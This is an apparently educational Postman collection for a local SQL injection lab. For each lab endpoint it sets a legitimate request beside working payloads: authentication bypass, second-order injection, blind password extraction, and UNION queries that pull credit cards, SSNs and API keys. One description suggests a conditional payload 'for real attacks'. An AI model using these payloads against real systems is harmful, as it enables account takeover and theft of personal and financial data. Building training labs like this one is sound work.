@@ -1,0 +1,452 @@
+{
+	"info": {
+		"_postman_id": "sql-injection-lab-vulnerable",
+		"name": "SQL Injection Lab - Vulnerable APIs",
+		"description": "Collection of vulnerable API endpoints demonstrating 8 different types of SQL Injection attacks. ⚠️ FOR EDUCATIONAL PURPOSES ONLY - DO NOT USE IN PRODUCTION!",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"item": [
+		{
+			"name": "1. First Order SQL Injection",
+			"item": [
+				{
+					"name": "getUserById - Legitimate",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/1",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "1"]
+						},
+						"description": "Legitimate request to get user by ID. Returns: 'admin'"
+					}
+				},
+				{
+					"name": "getUserById - SQL Injection Attack",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/1' OR '1'='1",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "1' OR '1'='1"]
+						},
+						"description": "❌ VULNERABLE: SQL Injection attack using OR condition to bypass ID check. Returns ALL users: 'admin, user, test'"
+					}
+				}
+			]
+		},
+		{
+			"name": "2. Authentication Bypass",
+			"item": [
+				{
+					"name": "Login - Legitimate",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/x-www-form-urlencoded"
+							}
+						],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "username",
+									"value": "admin",
+									"type": "text"
+								},
+								{
+									"key": "password",
+									"value": "secret123",
+									"type": "text"
+								}
+							]
+						},
+						"url": {
+							"raw": "http://localhost:8080/api/users/login",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "login"]
+						},
+						"description": "Legitimate login with correct credentials"
+					}
+				},
+				{
+					"name": "Login - SQL Comment Bypass",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/x-www-form-urlencoded"
+							}
+						],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "username",
+									"value": "admin' --",
+									"type": "text"
+								},
+								{
+									"key": "password",
+									"value": "wrongpassword",
+									"type": "text"
+								}
+							]
+						},
+						"url": {
+							"raw": "http://localhost:8080/api/users/login",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "login"]
+						},
+						"description": "❌ VULNERABLE: SQL comment (--) bypasses password check"
+					}
+				},
+				{
+					"name": "Login - OR 1=1 Bypass",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/x-www-form-urlencoded"
+							}
+						],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "username",
+									"value": "' OR '1'='1",
+									"type": "text"
+								},
+								{
+									"key": "password",
+									"value": "' OR '1'='1",
+									"type": "text"
+								}
+							]
+						},
+						"url": {
+							"raw": "http://localhost:8080/api/users/login",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "login"]
+						},
+						"description": "❌ VULNERABLE: OR condition always true bypasses authentication"
+					}
+				}
+			]
+		},
+		{
+			"name": "3. Second Order SQL Injection",
+			"item": [
+				{
+					"name": "Step 1: Create User - Store Malicious Username",
+					"request": {
+						"method": "POST",
+						"header": [
+							{
+								"key": "Content-Type",
+								"value": "application/x-www-form-urlencoded"
+							}
+						],
+						"body": {
+							"mode": "urlencoded",
+							"urlencoded": [
+								{
+									"key": "username",
+									"value": "hackerr'' or 1=1--",
+									"type": "text"
+								},
+								{
+									"key": "password",
+									"value": "password123",
+									"type": "text"
+								},
+								{
+									"key": "email",
+									"value": "hacker@example.com",
+									"type": "text"
+								}
+							]
+						},
+						"url": {
+							"raw": "http://localhost:8080/api/users/",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", ""]
+						},
+						"description": "❌ VULNERABLE Step 1: Stores malicious SQL in username field. The malicious username (hackerr'' or 1=1--) is stored safely in the database (not executed yet). Response returns the created user ID. Copy this ID for use in Step 2. This demonstrates delayed exploitation: data stored → retrieved later → executed."
+					}
+				},
+				{
+					"name": "Step 2: Get User Profile - Execute Stored Injection",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/profile/4",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "profile", "4"]
+						},
+						"description": "❌ VULNERABLE Step 2: Uses user ID from Step 1. Query flow: 1) SELECT username WHERE id = 4 (safe, parameterized by ID), 2) Retrieved username: hackerr'' or 1=1--, 3) SELECT email WHERE username = 'hackerr'' or 1=1--' (INJECTION TRIGGERS HERE!). The double single quotes escape to a single quote, then 'or 1=1' makes the condition always true, and '--' comments out the rest. This returns ALL users' emails. This demonstrates Second Order injection: malicious data stored in Step 1 → retrieved by ID (safe) → used in query (VULNERABLE!)."
+					}
+				}
+			]
+		},
+		{
+			"name": "4. Boolean-based Blind SQL Injection",
+			"item": [
+				{
+					"name": "Check User Exists - Legitimate",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/exists/admin",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "exists", "admin"]
+						},
+						"description": "Legitimate request to check if user exists"
+					}
+				},
+				{
+					"name": "Check User Exists - Extract Password (1st char)",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/exists/admin' AND SUBSTRING(password,1,1)='s'--",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "exists", "admin' AND SUBSTRING(password,1,1)='s'--"]
+						},
+						"description": "❌ VULNERABLE: Boolean-based blind injection to extract first character of password"
+					}
+				},
+				{
+					"name": "Check User Exists - Extract Password (2nd char)",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/exists/admin' AND SUBSTRING(password,2,1)='e'--",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "exists", "admin' AND SUBSTRING(password,2,1)='e'--"]
+						},
+						"description": "❌ VULNERABLE: Boolean-based blind injection to extract second character of password"
+					}
+				}
+			]
+		},
+		{
+			"name": "5. Time-based Blind SQL Injection",
+			"item": [
+				{
+					"name": "Get User Email - Legitimate",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/email/1",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "email", "1"]
+						},
+						"description": "Legitimate request to get user email"
+					}
+				},
+				{
+					"name": "Get User Email - Time-based Attack",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/email/1' AND SLEEP(5)--",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "email", "1' AND SLEEP(5)--"]
+						},
+						"description": "❌ VULNERABLE: Time-based blind injection using SLEEP(5). Response will take ~5 seconds, demonstrating time-based SQL injection. For real attacks, use conditional: 1' AND IF(SUBSTR(password,1,1)='s', SLEEP(5), 0)--"
+					}
+				}
+			]
+		},
+		{
+			"name": "6. UNION-based SQL Injection",
+			"item": [
+				{
+					"name": "Search User - Legitimate",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/search?username=admin",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "search"],
+							"query": [
+								{
+									"key": "username",
+									"value": "admin"
+								}
+							]
+						},
+						"description": "Legitimate search for username"
+					}
+				},
+				{
+					"name": "Search User - UNION Extract Credit Cards",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/search?username=' UNION SELECT credit_card FROM sensitive_data--",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "search"],
+							"query": [
+								{
+									"key": "username",
+									"value": "' UNION SELECT credit_card FROM sensitive_data--"
+								}
+							]
+						},
+						"description": "❌ VULNERABLE: UNION injection to extract credit card numbers from sensitive_data table"
+					}
+				},
+				{
+					"name": "Search User - UNION Extract SSN",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/search?username=' UNION SELECT ssn FROM sensitive_data--",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "search"],
+							"query": [
+								{
+									"key": "username",
+									"value": "' UNION SELECT ssn FROM sensitive_data--"
+								}
+							]
+						},
+						"description": "❌ VULNERABLE: UNION injection to extract Social Security Numbers"
+					}
+				},
+				{
+					"name": "Search User - UNION Extract API Keys",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/search?username=' UNION SELECT secret_key FROM sensitive_data--",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "search"],
+							"query": [
+								{
+									"key": "username",
+									"value": "' UNION SELECT secret_key FROM sensitive_data--"
+								}
+							]
+						},
+						"description": "❌ VULNERABLE: UNION injection to extract API keys and secret tokens"
+					}
+				}
+			]
+		},
+		{
+			"name": "7. Error-Based SQL Injection",
+			"item": [
+				{
+					"name": "Get User Password - Legitimate",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/password/1",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "password", "1"]
+						},
+						"description": "✅ Legitimate request to get user password (for demo purposes only)"
+					}
+				},
+				{
+					"name": "Get User Password - SQL Error Message",
+					"request": {
+						"method": "GET",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/api/users/password/1'",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["api", "users", "password", "1'"]
+						},
+						"description": "❌ VULNERABLE: Error-based injection - Invalid SQL syntax reveals error message exposing database structure"
+					}
+				}
+			]
+		},
+		{
+			"name": "Database Reset",
+			"item": [
+				{
+					"name": "Reset Database",
+					"request": {
+						"method": "POST",
+						"header": [],
+						"url": {
+							"raw": "http://localhost:8080/reset-db",
+							"protocol": "http",
+							"host": ["localhost"],
+							"port": "8080",
+							"path": ["reset-db"]
+						},
+						"description": "🔄 Reset the database to its initial state. Drops and recreates all tables with default data. Useful after running multiple SQL injection tests."
+					},
+					"response": []
+				}
+			]
+		}
+	],
+	"variable": [
+		{
+			"key": "baseUrl",
+			"value": "http://localhost:8080",
+			"type": "string"
+		}
+	]
+}
